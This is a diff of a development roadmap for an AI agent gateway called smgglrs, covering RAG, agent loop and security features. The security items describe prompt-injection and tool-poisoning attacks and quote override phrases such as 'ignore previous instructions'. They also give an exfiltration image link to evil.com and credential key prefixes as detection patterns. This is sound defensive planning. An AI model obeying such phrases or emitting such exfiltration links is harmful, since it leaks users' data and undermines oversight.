+After cross-encoder reranking, compute mean relevance score of
+top-k results and abstain if below threshold:
+
+- **Mean score computation**: After `CrossEncoderReranker::rerank`,
+  compute mean score of top-k results.
+- **Confidence gate**: If mean score < configurable threshold
+  (default 0.4), return a confidence warning in the tool response
+  instead of low-quality context.
+- **Abstention pattern**: Return "Insufficient information to
+  answer this query" when confidence is below threshold. This is
+  the hallucination defense mechanism — the system working
+  correctly, not failing.
+- **Config**: Add `ConfidenceGate { threshold: f32, abstain_message:
+  String }` to RAG module config.
+
+Systems without abstention capability are considered prototypes,
+not production systems (2026 consensus).
+
+**Effort**: 0.5-1 day. **Priority**: High.
+**Acceptance**: Query with no relevant documents returns abstention
+message instead of low-quality results.
+
+Reference: Confidence-Aware RAG (Microsoft TechCommunity),
+Production RAG Guide 2026.
+
+#### 7h. Batch cross-encoder scoring (NEW — tech watch 2026-05-25)
+
+**Crate**: `smgglrs-rag` (rerank.rs)
+
+Change `CrossEncoderReranker::rerank` to batch all `(query, candidate)`
+pairs into a single ONNX inference call instead of N sequential calls:
+
+- **Current**: `score_pair` processes one pair at a time. For 20
+  candidates, that's 20 ONNX inference calls.
+- **Batched**: Concatenate all pairs into a single input tensor
+  with batch dimension = N. One ONNX call produces all scores.
+- **Latency reduction**: O(N * inference_time) → O(inference_time).
+  For 20 candidates at ~5ms/pair, this is 100ms → ~10ms.
+- **Dynamic batching**: Handle variable-length inputs with padding
+  and attention masks.
+
+**Effort**: 0.5-1 day. **Priority**: Medium-High.
+**Acceptance**: Reranking 20 candidates takes <15ms instead of ~100ms.
+
+Reference: BGE reranker batch scoring, Ailog cross-encoder study.
+
+#### 7i. Section-level pointer retrieval (NEW — tech watch 2026-05-25)
+
+**Crate**: `smgglrs-rag` (store.rs, chunk.rs)
+
+Store the parent section byte range alongside chunk byte range.
+On retrieval, return the full intact section content instead of
+the chunk fragment:
+
+- **Storage**: Add `section_start_byte INTEGER, section_end_byte
+  INTEGER` to `rag_chunks` table (byte range of the heading-to-
+  next-heading section containing this chunk).
+- **Retrieval**: After vector/hybrid search identifies relevant
+  chunks, load the full parent section from the original document
+  instead of the chunk text.
+- **Deduplication**: Multiple chunks from the same section are
+  deduplicated to a single section in the results.
+- **LLM context**: The LLM receives complete, unbroken document
+  sections rather than truncated fragments. This is the core
+  Proxy-Pointer insight.
+
+**Effort**: 1-2 days. **Priority**: Medium-High.
+**Depends on**: 7f (breadcrumb injection provides heading structure).
+**Acceptance**: Retrieved context contains complete sections, not
+truncated chunks. LLM answers are more accurate on structured docs.
+
+Reference: Proxy-Pointer RAG pointer-based context.
+
+#### 7j. Metadata pre-filtering in RAG search (NEW — tech watch 2026-05-25)
+
+**Crate**: `smgglrs-rag` (store.rs)
+
+Add structured metadata columns to `rag_chunks` for pre-filtering
+before vector search (filter before scoring, not after):
+
+- **New columns**: `doc_type TEXT`, `updated_at INTEGER`,
+  `tags_json TEXT` in `rag_chunks`.
+- **SearchFilter struct**: Optional constraints on doc_type,
+  time range, tags. Applied as SQL WHERE clauses before the
+  vec0 MATCH operation.
+- **Scoped search**: "Search only in code files", "search documents
+  modified in the last 7 days", "search only tagged 'security'".
+- **Consistency**: `MemoryRetriever` already has `search_scoped` —
+  extend the same pattern to the RAG layer.
+
+**Effort**: 0.5-1 day. **Priority**: Medium.
+**Acceptance**: Scoped RAG search on doc_type returns results from
+matching documents only.
+
+Reference: Context-Aware Search (Machine Learning Mastery),
+Context Engine library.
 
 ### Phase 8: Warp-informed UX patterns (NEW — 2026-05-04)
 
@@ -1566,6 +2249,56 @@ are available at all.
 
 Reference: Genkit Skills middleware (2026-05), Osmani harness
 engineering (O'Reilly Radar, 2026-05).
+
+#### 8j. Loop detection middleware (NEW — tech watch 2026-05-25)
+
+**Crate**: `smgglrs-agent` (tool_loop.rs)
+
+Add per-tool-per-target counters in the tool loop to detect
+repetitive behavior and inject course-correction context:
+
+- **Counter**: Track `(tool_name, primary_arg)` pairs across
+  iterations. Example: `(file_edit, "src/main.rs")` count = 5.
+- **Threshold**: After N calls to the same tool with similar
+  arguments (default N=3), inject a "reconsider your approach"
+  context message into the next prompt.
+- **Progressive escalation**: N+2 → stronger warning. N+4 → force
+  different tool selection. N+6 → abort loop.
+- **ActionRecord integration**: The existing `ActionRecord` already
+  tracks tool calls — add per-target counting on top.
+
+LangChain measured 13.7-point improvement (52.8% → 66.5%) with
+this pattern on Terminal Bench 2.0.
+
+**Effort**: 0.5-1 day. **Priority**: Medium.
+**Acceptance**: Agent editing the same file 4+ times gets a
+"reconsider" injection. Loop terminates instead of spinning.
+
+Reference: LangChain harness engineering, WebWright loop detection.
+
+#### 8k. Reasoning compute allocation (NEW — tech watch 2026-05-25)
+
+**Crate**: `smgglrs-agent` (tool_loop.rs)
+
+Add a `reasoning_phase` field to `ToolLoopConfig` that maps
+iteration ranges to temperature/reasoning levels:
+
+- **Phase definition**: `phases: [{range: "1-2", temp: 0.1,
+  reasoning: "high"}, {range: "3-N", temp: 0.0, reasoning: "low"},
+  {range: "final", temp: 0.1, reasoning: "high"}]`
+- **Reasoning sandwich**: High reasoning for planning iterations,
+  low for execution, high for verification. Validated: xhigh/high/
+  xhigh = 66.5% vs all-xhigh 53.9% (LangChain).
+- **Integration**: The Weaver's `assemble_with_phase` already
+  supports planning/execution phases. Extend with per-iteration
+  temperature overrides.
+
+**Effort**: 0.5-1 day. **Priority**: Medium.
+**Acceptance**: Tool loop uses different temperatures for planning
+vs execution iterations.
+
+Reference: LangChain reasoning sandwich, NVIDIA financial signal
+discovery (temp 0.8/0.0/0.5).
 
 ### Phase 9: Full MCP spec coverage (2026-05-04, mostly complete)
 
@@ -1836,6 +2569,272 @@ latency reduction vs SSE in 10+ call sequences.
 
 Reference: OpenAI WebSocket Responses API (InfoQ, 2026-05-08),
 40% latency reduction at Vercel, 30% at Cursor.
+
+#### 9m. Upstream tool definition scanning at startup (NEW — tech watch 2026-05-25)
+
+**Crate**: `smgglrs-core` (upstream module) + `smgglrs-security`
+(new `tool_scanner.rs`)
+
+When proxying upstream MCP servers, scan their tool definitions for
+security threats before exposing them to agents. This is the #1
+security gap identified in the 2026-05-25 tech watch:
+
+- **Scan categories** (from AGT MCP Extensions + SkillSpector):
+  1. **Tool poisoning**: Hidden instructions in tool descriptions
+     (e.g., "ignore previous instructions and...")
+  2. **Typosquatting**: Tool names similar to built-in tools
+     (e.g., `file_raed` vs `file_read`)
+  3. **Schema abuse**: Input fields requesting sensitive data
+     ("token", "password", "system_prompt", "api_key")
+  4. **Hidden Unicode**: Zero-width characters, homoglyphs in
+     tool names or descriptions
+  5. **Description injection**: Imperative overrides ("you must
+     always call this tool first")
+  6. **Cross-server attacks**: Tool descriptions referencing
+     tools from other upstream servers
+  7. **Intent-behavior mismatch**: Tool description says "read"
+     but schema has write-like parameters (SkillSpector pattern)
+  8. **Rug pull**: Tool definition changed since last scan
+     (hash-based change detection)
+- **Scan timing**: On upstream connection (re)establishment.
+  Cached results invalidated on `notifications/tools/list_changed`.
+- **Verdicts**: Each tool gets SAFE / SUSPICIOUS / MALICIOUS.
+  MALICIOUS tools are blocked. SUSPICIOUS tools are logged and
+  optionally require approval.
+- **Config**: `[upstream.scan] enabled = true, block_malicious = true,
+  warn_suspicious = true`.
+
+30 CVEs filed targeting MCP infrastructure in Jan-Feb 2026; 43%
+were shell injection. Knostic scanned 1,862 exposed MCP servers —
+every one had zero authentication. This is not theoretical.
+
+**Effort**: 2-3 days. **Priority**: P0 — Critical.
+**Acceptance**: Upstream MCP server with hidden instructions in
+tool description is detected and blocked. Typosquatting flagged.
+
+Reference: Microsoft AGT MCP Extensions startup scanning,
+NVIDIA SkillSpector, OWASP Agentic Top 10 (ASI04 Supply Chain).
+
+#### 9n. Cognitive file integrity monitoring (NEW — tech watch 2026-05-25)
+
+**Crate**: `smgglrs-security` (new `integrity_monitor.rs`)
+
+Monitor persona/directive/heuristic YAML files for tampering using
+SHA-256 baselines with semantic drift detection:
+
+- **Baseline**: On startup, compute SHA-256 of all cognitive files
+  (persona YAML, heuristics, directives, CLAUDE.md, SOUL.md).
+  Store in memory.
+- **Periodic scan**: Every 60 seconds (configurable), recompute
+  hashes. On mismatch, trigger analysis.
+- **Semantic triage**: For changed files, compute embedding
+  similarity between old and new content. Large semantic drift
+  (>threshold) triggers MALICIOUS alert. Small drift (typo fix,
+  wording improvement) triggers BENIGN notice with baseline update.
+- **Persistent alerts**: MALICIOUS changes raise alerts that
+  persist until manually acknowledged. BENIGN changes silently
+  update the baseline.
+- **Zero-bypass design**: The monitor runs as gateway code,
+  independent of LLM invocation. The LLM cannot suppress it.
+
+ClawPatrol (Enkrypt AI) already ships this pattern. smgglrs should
+implement it before it becomes an expected feature.
+
+**Effort**: 1-2 days. **Priority**: P0 — Critical.
+**Acceptance**: Modifying a persona YAML file to inject "ignore
+safety rules" triggers MALICIOUS alert within 60 seconds.
+
+Reference: ClawPatrol cognitive file integrity (Enkrypt AI),
+OWASP Agentic Top 10 (ASI01 Goal Hijack).
+
+#### 9o. Gateway-level field filtering (NEW — tech watch 2026-05-25)
+
+**Crate**: `smgglrs-core` (upstream module, hooks)
+
+Strip unnecessary fields from upstream MCP server tool responses
+before forwarding to agents, reducing token consumption:
+
+- **Per-tool response filter**: Config specifies which JSON fields
+  to retain per tool:
+  ```toml
+  [[upstream.tools]]
+  name = "database_query"
+  response_fields = ["id", "name", "status"]
+  ```
+- **Hook implementation**: `FieldFilterHook` as post-call hook
+  that prunes tool response JSON to only include specified fields.
+- **TOON-style compression**: Optional compact serialization mode
+  (strip nulls, abbreviate keys, remove formatting whitespace).
+- **Savings**: MCP tool call returning 50 fields when 3 are needed
+  wastes thousands of tokens per call. Gateway-level filtering is
+  a natural fit — only smgglrs (as a gateway) can do this.
+
+Token burn data: agents burn 10-100x more tokens than chatbots.
+Structural retrieval vs grep-based shows 14x cost difference
+(8,500 vs 117,000 tokens).
+
+**Effort**: 1-2 days. **Priority**: Medium-High.
+**Acceptance**: Tool response with 50 fields filtered to 3 fields
+before reaching agent. Token savings measured.
+
+Reference: Token burn problem (TDS), TOON compact notation,
+MindStudio MCP token optimization.
+
+#### 9p. HASP Program Functions as SkillHook (NEW — tech watch 2026-05-25)
+
+**Crate**: `smgglrs-security` (new `skill_hook.rs`)
+
+Implement HASP-style Program Functions in the hook pipeline,
+transforming passive heuristics into executable guardrails:
+
+- **`SkillHook` trait**: Implements two methods:
+  - `should_activate(step_context: &StepContext, action: &AgentAction)
+    -> bool` — deterministic activation predicate
+  - `intervene(step_context: &StepContext, action: &AgentAction)
+    -> Intervention` — returns MODIFY_ACTION (rewrite tool args),
+    INJECT_CONTEXT (add to next prompt), or NOOP
+- **Activation predicates**: Defined in heuristics YAML alongside
+  existing heuristic entries. Example: "when action is file_write
+  and path matches /etc/*, inject 'verify permissions first'".
+- **Hook pipeline integration**: SkillHooks fire between model
+  response parsing and tool execution (pre-tool-call position).
+- **Strict validation**: HASP found that unfiltered PF evolution
+  caused performance collapse (60.3% → 36.3%). SkillHooks must
+  pass validation (no self-modifying, no recursive activation,
+  bounded intervention size).
+
+HASP achieved 25% improvement over multi-loop ReAct Agent and
+30.4% gain over Search-R1, with no model training.
+
+**Effort**: 2-3 days. **Priority**: Medium-High.
+**Acceptance**: SkillHook intercepts file_write to /etc/* and
+injects verification context. Agent behavior improves without
+model retraining.
+
+Reference: HASP (arXiv 2605.17734), smgglrs-security hook pipeline.
+
+#### 9q. Response sanitization pattern audit (NEW — tech watch 2026-05-25)
+
+**Crate**: `smgglrs-security` (safety filters)
+
+Audit and extend the SafetyHook regex ruleset against AGT's
+comprehensive sanitization patterns:
+
+- **Prompt-injection tags**: `<system>`, `<instructions>`,
+  `<|im_start|>`, `<|endoftext|>`, and other special tokens
+  in tool responses.
+- **Imperative overrides**: "ignore previous instructions",
+  "disregard your training", "you are now a different AI".
+- **Credential leakage**: API key patterns (`sk-...`, `ghp_...`,
+  `AKIA...`), bearer tokens, connection strings.
+- **Exfiltration URLs**: Markdown image/link injection
+  (`![](https://evil.com/exfil?data=...)`) in tool responses.
+- **Implementation**: Add missing patterns to existing regex
+  safety filter. Each pattern with category tag for metrics.
+
+**Effort**: 0.5-1 day. **Priority**: Medium.
+**Acceptance**: Known prompt-injection patterns in tool responses
+are detected and sanitized. Coverage checklist documented.
+
+Reference: Microsoft AGT response sanitization, OWASP Agentic
+Top 10 (ASI01 Goal Hijack).
+
+#### 9r. Dynamic trust scoring with decay (NEW — tech watch 2026-05-25)
+
+**Crate**: `smgglrs-security` (new `trust_score.rs`)
+
+Add dynamic trust scoring per session/agent that decays without
+positive signals, complementing static deny-wins ACLs:
+
+- **Trust score**: 0-1000 integer per session. Starts at baseline
+  (configurable per agent type, default 500).
+- **Positive signals**: Successful tool calls within expected
+  parameters, following expected patterns. +10 per successful
+  bounded action.
+- **Negative signals**: Permission denials, safety filter triggers,
+  unexpected tool call patterns. -50 per denial, -100 per safety
+  trigger.
+- **Time decay**: Trust decays by 1 point per minute of inactivity.
+  Long-running agents with no positive signals gradually lose
+  privileges.
+- **Progressive restriction**: At trust < 300, read-only mode.
+  At trust < 100, session suspended pending review.
+- **Interaction with ACLs**: Trust scoring does not override
+  deny-wins ACLs. It provides an additional layer — an agent
+  within its ACL-allowed operations can still be restricted if
+  its trust score drops.
+
+Microsoft AGT implements this as 0-1000 with 4-ring privilege
+isolation. smgglrs's version is simpler (no rings, just progressive
+restriction) but integrates with the existing IFC + ACL stack.
+
+**Effort**: 2-3 days. **Priority**: Medium.
+**Acceptance**: Agent that triggers 3 safety filters sees trust
+score drop and loses write access. Score recovers after successful
+read-only operations.
+
+Reference: Microsoft AGT trust decay, OWASP Agentic Top 10
+(ASI10 Rogue Agents).
+
+#### 9s. Risk-tiered approval (NEW — tech watch 2026-05-25)
+
+**Crate**: `smgglrs-security` (permissions)
+
+Upgrade binary allow/deny to graduated approval based on action
+risk level:
+
+- **Risk tiers**: Read-only = auto-approve (notify), Write =
+  require approval, Irreversible = hard gate (explicit confirmation
+  + reason).
+- **Integration with AgentAction**: The existing `RiskLevel` enum
+  (Phase 8a) already classifies actions. Wire this into the
+  permission engine so risk level determines the approval flow.
+- **Notification channel**: Low-risk actions are logged but not
+  prompted. Medium-risk actions trigger D-Bus notification with
+  auto-approve timeout. High-risk actions block until explicit
+  approval.
+- **Per-persona override**: Some personas (e.g., "ops-agent") may
+  have higher risk tolerance. Configure via persona YAML.
+
+Emerging everywhere: Gemini Spark, Microsoft AGT, HASP, WebWright.
+The binary allow/deny model is too coarse for production agentic
+workflows.
+
+**Effort**: 1-2 days. **Priority**: Medium.
+**Depends on**: 8a (typed AgentAction with RiskLevel).
+**Acceptance**: Read-only tool calls auto-approved. Write tool calls
+prompt for approval. Delete tool calls require explicit confirmation.
+
+Reference: Gemini Spark tiered approval, Six Choices article
+(selective HITL).
+
+#### 9t. HTML-to-markdown conversion for upstream content (NEW — tech watch 2026-05-25)
+
+**Crate**: `smgglrs-core` (upstream module, hooks)
+
+When smgglrs proxies upstream MCP servers that return HTML content,
+optionally convert to markdown before feeding to agents:
+
+- **ContentConversionHook**: Post-call hook that detects HTML in
+  tool responses and converts to markdown using a lightweight
+  HTML-to-markdown parser.
+- **Token savings**: HTML burns ~3x more tokens than equivalent
+  markdown. At 1M+ context windows the cost argument is weaker,
+  but for small local models the savings matter.
+- **Dual-format support**: HTML for human-facing outputs (agent
+  reports, dashboards), markdown for agent-to-agent communication
+  and memory storage. The cognitive layer's persona YAML can
+  specify `output_format: html | markdown`.
+- **Cloudflare precedent**: Cloudflare launched "Markdown for
+  Agents" in Feb 2026 — network-level HTML-to-markdown when AI
+  systems request pages.
+
+**Effort**: 1 day. **Priority**: Low-Medium.
+**Acceptance**: HTML tool response converted to markdown before
+reaching agent. Token count reduced.
+
+Reference: Anthropic "HTML is the new Markdown" (2026-05),
+Cloudflare Markdown for Agents.
 
 ### Phase 10: Papers (restructured 2026-05-06)
 
@@ -2125,6 +3124,68 @@ premium, with measurable cost reduction and no quality loss.
 Reference: vLLM Semantic Router (Red Hat), NadirClaw, RouteLLM
 (Berkeley), R2-Router (UIUC).
 
+#### 11i. delta-mem OSAM evaluation (NEW — tech watch 2026-05-25)
+
+**Crate**: `smgglrs-model-runtime` (evaluation)
+
+Evaluate delta-mem's Online State of Associative Memory (OSAM) as
+a working memory mechanism for locally-served small models:
+
+- **OSAM**: Fixed-size matrix dynamically updated with each
+  interaction. Acts as compressed working memory that persists
+  across turns. Adds only 0.12% of backbone parameters.
+- **Target model**: Granite-3.2-3B on Lunar Lake 268V NPU.
+  delta-mem achieved 51.66% on Qwen3-4B-Instruct (vs 46.79%
+  frozen baseline).
+- **Working memory vs RAG**: delta-mem handles intra-session
+  working memory (active context management). smgglrs-memory's
+  FTS5+sqlite-vec handles cross-session retrieval. Complementary,
+  not competing.
+- **Integration path**: If evaluation is positive, add OSAM
+  matrix to the model serving layer. The LLM backbone stays
+  frozen; only the OSAM matrix is learned/updated.
+
+**Effort**: 2 days (eval). **Priority**: Medium.
+**Gate**: Does OSAM integrate with ONNX runtime? What's the
+quality impact on Granite-3.2-3B vs Qwen3-4B?
+**Acceptance**: Measurable improvement on multi-turn tool-calling
+tasks with Granite-3.2-3B + OSAM on NPU.
+
+Reference: delta-mem (Mind Lab, VentureBeat 2026-05-21),
+Memory Agent Bench.
+
+#### 11j. Harness-aligned training data generation (NEW — tech watch 2026-05-25)
+
+**Crate**: `smgglrs-model-runtime` (training data)
+
+Generate fine-tuning training data using smgglrs's actual tool
+schemas and MCP message format, following MagenticBrain's
+harness-aligned training methodology:
+
+- **Training data format**: Multi-step tool-calling trajectories
+  using smgglrs tool definitions (not generic function-calling
+  examples). Include smgglrs-specific message format, tool
+  annotations, and IFC labels.
+- **Dual-trajectory**: Combine (a) tool-calling trajectories and
+  (b) coding/terminal trajectories. The model learns when to call
+  a tool vs when to write code.
+- **Delegation examples**: Include explicit "hand off to specialist"
+  trajectories. The orchestrator learns when not to act.
+- **Three-gate verification**: Correctness (LLM rubrics) +
+  efficiency (token/iteration penalty) + user-interaction
+  verification. Reject training examples that fail any gate.
+- **Target**: Granite models for smgglrs-specific fine-tuning.
+  MagenticBrain proves this eliminates the train/deploy gap.
+
+**Effort**: Research + data generation. **Priority**: Medium.
+**Gate**: Is the training data quality sufficient? Does harness-
+aligned Granite outperform generic Granite on smgglrs tasks?
+**Acceptance**: Fine-tuned Granite model achieves higher tool-call
+accuracy on smgglrs-specific tasks than base model.
+
+Reference: MagenticLite/MagenticBrain (Microsoft Research),
+Fara1.5 FaraGen1.5 synthetic data pipeline.
+
 #### 11c. Adversarial safety evaluation
 
 **Crates**: `smgglrs-security` (safety classifier),
@@ -2252,6 +3313,68 @@ specialists are selected.
 Reference: GitHub "Validating Agentic Behavior" (2026-05-08),
 Prefix Tree Acceptors, dominator analysis.
 
+#### 12e. Trajectory-level evaluation metrics (NEW — tech watch 2026-05-25)
+
+**Crate**: `smgglrs-flow` (eval.rs)
+
+Extend the existing `RunMetrics` and `EvalSummary` with trajectory-
+level evaluation inspired by NVIDIA's agent evaluation framework:
+
+- **Task Success Rate (TSR) per scenario**: Tag evaluations with
+  scenario type (normal, degraded tools, ambiguous instructions).
+  Current `EvalSummary` only does aggregate precision.
+- **Tool call accuracy**: Right tool chosen vs available tools.
+  The `ActionRecord` already captures tool calls — add scoring.
+- **Trajectory efficiency**: Tokens consumed per successful task.
+  Report as `tokens_per_success` alongside existing
+  `tokens_per_finding`.
+- **Failure mode classification**: Categorize failures as
+  plan_failure, tool_failure, environment_failure, verification_
+  failure. Distribution analysis reveals systemic weaknesses.
+- **Tool budget compliance**: The `ToolLoopConfig` already has
+  `max_iterations` and `max_tokens_per_run`. Report compliance
+  rate ("95% of tasks completed under N tool calls").
+
+Industry data: 37% gap between lab benchmarks and real-world
+deployment. Agent success drops from 60% single-run to 25% across
+8 runs. These metrics catch that brittleness.
+
+**Effort**: 2-3 days. **Priority**: Medium.
+**Acceptance**: Eval output includes scenario-tagged TSR, trajectory
+efficiency, and failure mode distribution.
+
+Reference: NVIDIA Mastering Agentic Techniques (2026-05),
+DeepEval agentic metrics, Galileo agent evaluation framework.
+
+#### 12f. RAMPART-style safety test suite (NEW — tech watch 2026-05-25)
+
+**Crate**: `smgglrs-security` (tests)
+
+Build an automated red-team test suite for smgglrs's safety filters,
+inspired by Microsoft RAMPART:
+
+- **Variant generation**: For each known attack vector (prompt
+  injection, tool poisoning, credential exfiltration), generate
+  100+ variants using template substitution and paraphrasing.
+- **Statistical thresholds**: "This filter must block ≥80% of
+  variants across N=100 runs" — accounts for probabilistic model
+  behavior.
+- **CI integration**: Run as part of `cargo test` with feature
+  flag `safety-bench`. Regression tests for every safety fix.
+- **Attack categories**: Cross-prompt injection (highest priority —
+  agents processing poisoned content), tool description injection,
+  imperative overrides, credential leakage, exfiltration URLs.
+- **NIST finding**: Tailored attacks raise task-hijacking from 11%
+  to 81% ASR. Generic safety filters are insufficient — tests
+  must be crafted for smgglrs's specific architecture.
+
+**Effort**: 2-3 days. **Priority**: Medium-High.
+**Acceptance**: Safety filter regression suite with 500+ variants
+across 5 attack categories. CI green on all.
+
+Reference: Microsoft RAMPART (2026-05-20), Dreadnode SDK
+(arXiv 2605.04019), NIST AI RMF Playbook (2026-03).
+
 #### 12b. Infrastructure debt (MEDIUM)
 
 Collected from Code Health, self-review findings, and DESIGN.md:
@@ -2310,14 +3433,19 @@ can compute these):
 counters. Operators choose their backend (Phoenix, Langfuse,
 Datadog, Grafana). OpenLLMetry-style instrumentation for portability.
 
-**Effort**: 3-4 days. **Priority**: High.
+**EU AI Act compliance**: Fully enforceable August 2026. Requires
+comprehensive logging and traceability for high-risk AI systems.
+OTLP export is now a regulatory requirement, not just competitive
+table-stakes. ClawPatrol already ships OTLP telemetry export.
+
+**Effort**: 3-4 days. **Priority**: P0 — Critical (regulatory).
 **Acceptance**: Tool calls visible in any OTel-compatible backend
 with security decision attributes. Prometheus endpoint scraped
 by standard monitoring.
 
 Reference: OTel GenAI semantic conventions, 12-metric evaluation
 framework (TDS), OpenLLMetry, Arize Phoenix, MintMCP enterprise
-requirements.
+requirements, ClawPatrol OTLP export, EU AI Act Article 14.
 
 ### Phase 13: Peer review readiness (2026-05-07 review)
 
@@ -2391,6 +3519,24 @@ late 2025 are now contested.
 | Zep/Graphiti temporal knowledge graph | 2 | Should cite |
 | Claw-Eval-Live workflow benchmark (CUHK) | 3 | Should cite |
 | SkillOS skill curation (Google Cloud AI) | 2 | Should cite |
+| NanoResearch tri-level co-evolution (2605.10813) | 2 | Should cite |
+| LIFE Framework MAS survey (2605.14892) | 2 | Should cite |
+| HASP Program Functions (2605.17734) | 1, 2 | **Must cite** |
+| SDB formalization (2605.20173) | 1, 2 | **Must cite** |
+| delta-mem OSAM (Mind Lab) | 2 | Should cite |
+| MagenticLite/MagenticBrain (Microsoft Research) | 2 | Should cite |
+| Proxy-Pointer RAG (2026) | 2 | Should cite |
+| Microsoft RAMPART (2026-05-20) | 1 | **Must cite** |
+| NVIDIA Verified Agent Skills / SkillSpector | 1 | **Must cite** |
+| OpenAI Secure MCP Tunnels | 1 | Should cite |
+| ClawPatrol (Enkrypt AI) | 1 | **Must cite** |
+| IBM ContextForge | 1 | **Must cite** |
+| Google AX distributed runtime | 2 | Should cite |
+| WebWright self-verification (Microsoft Research) | 3 | Should cite |
+| Microsoft network-level red teaming (2026-05) | 1 | **Must cite** |
+| Dreadnode SDK red teaming (2605.04019) | 1 | Should cite |
+| Anthropic MCP Tunnels + self-hosted sandboxes | 1 | Should cite |
+| NemoClaw MCPS signing (Issue #204) | 1 | Should cite |
 
 #### 13d. Paper restructuring decisions
 
@@ -2649,7 +3795,7 @@ progress through pending → running → completed with live output.
 
 **Crate**: `smgglrs-server/ui/`
 
-- Rename from "myelix" to "smgglrs" throughout the UI
+- Rename throughout the UI to "smgglrs"
   (title, welcome message, header brand)
 - Responsive layout for mobile/tablet (ops dashboard on phone)
 - Dark/light theme toggle (currently dark-only)
@@ -2782,8 +3928,48 @@ is building: web UI (Phase 15), marketplace/registry (planned).
 - **Watch**: AGT Rust package closely — if it gains IFC or gateway
   mode, it becomes a direct competitor
 
+**Updated 2026-05-25**: AGT shipped MCP Extensions for .NET
+(`Microsoft.AgentGovernance.Extensions.ModelContextProtocol`).
+Adds startup tool scanning (8 threat categories: poisoning,
+typosquatting, hidden instructions, schema abuse, hidden Unicode,
+description injection, cross-server attacks, rug pulls), response
+sanitization (prompt-injection tags, imperative overrides, credential
+leakage, exfiltration URLs), YAML policy model (default_action: deny),
+DID-based identity, and fail-closed defaults. Broader AGT base includes
+execution rings (4 privilege levels), trust decay (0-1000 score),
+Ed25519 plugin signing, saga orchestration, circuit breakers, and
+kill switches. Upstream tool scanning (9m) is our most critical gap
+identified from this comparison.
+
 Reference: Microsoft AGT (github.com/microsoft/agent-governance-toolkit),
-AGT architecture deep dive (TechCommunity blog, April 2026).
+AGT architecture deep dive (TechCommunity blog, April 2026),
+AGT MCP Extensions for .NET (DevBlogs, May 2026).
+
+### Competitive landscape update (May 2026 tech watch)
+
+The MCP gateway space exploded: 97M monthly SDK downloads, 30 CVEs
+in 60 days, 88% of orgs reporting agent security incidents.
+
+| Gateway | Threat | Key Feature | smgglrs Advantage |
+|---------|--------|-------------|-------------------|
+| IBM ContextForge | HIGH | Cedar RBAC, A2A, 40+ plugins, 3500+ stars | IFC, in-process ML safety |
+| Envoy AI Gateway | MEDIUM | MCPRoute v1beta1, CEL auth, AAIF/LF | Gateway-enforced IFC, orchestration |
+| ClawPatrol (Enkrypt AI) | MEDIUM | 6 gateway hooks, cognitive file integrity, skill scanning | In-process ONNX (no cloud API), deny-wins ACLs |
+| DefenseClaw (Cisco) | MEDIUM | Admission control + runtime guardrails + OpenShell | IFC, flow orchestration |
+| Bifrost | LOW | 11us overhead at 5k RPS, dual client/server | IFC, ML safety, orchestration |
+| Lasso Security | LOW | Prompt injection detection, reputation scoring | ML safety depth, IFC |
+| Docker MCP Gateway | LOW | Container isolation, Scout scanning | No RBAC, no audit — dev tool only |
+
+smgglrs unique position: **IFC + in-process ML safety + flow
+orchestration + OpenShell integration**. No single competitor
+covers all four.
+
+Critical gap from ClawPatrol: cognitive file integrity monitoring
+(SHA-256 + semantic drift). Implement before it becomes expected
+(Phase 9n).
+
+Reference: Tech watch 2026-05-25, Lunar.dev gateway comparison,
+Composio gateway ranking.
 
 ### Goose relationship (April 2026 analysis)
 
@@ -2793,7 +3979,7 @@ AGT architecture deep dive (TechCommunity blog, April 2026).
 - Goose connects to MCP servers directly (no proxy/filter)
 - Contribution targets: MCP interceptor pattern (SEP-1763),
   Linux extension sandboxing, safety hook pipeline, ACL engine
-- ACP adoption gives Myelix agents IDE integration for free
+- ACP adoption gives smgglrs agents IDE integration for free
 
 ### ZeroClaw (April 2026 analysis)
 
@@ -2853,7 +4039,7 @@ AGT architecture deep dive (TechCommunity blog, April 2026).
 
 ## Non-goals
 
-These capabilities from Python Myelix are intentionally NOT replicated:
+These capabilities from the original Python prototype are intentionally NOT replicated:
 
 - **Docker deployment**: Rust binary is self-contained
 - **Python engine wrappers**: replaced by ModelBackend trait
